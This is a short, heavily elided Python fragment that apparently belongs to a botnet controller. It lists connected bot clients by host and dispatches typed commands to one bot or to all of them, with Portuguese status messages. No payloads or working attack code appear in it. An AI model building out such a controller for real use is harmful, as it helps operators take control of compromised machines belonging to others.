...
def botActions(botCommandLS):
    if "-ls" in botCommandLS:
        ...
        for client in botNet:
            ...
            print(str(cnt) + '. [*] Saida de ' + client.host)
        ...
        if len(botCommandLS) > 0:
            ...
            print("Nao nao esta matchingg: " + botCommandLS[0][1:])
    else:
        print("Comando nao encontrando : 12381")
    ...
    while 1:
        ...
        if len(command.split(": ")) > 1:
            ...
            if commandLS[0] == "local":
                ...
                print("Comando nao. Encontrado : 18319")
        else:
            if currentBot == "*":
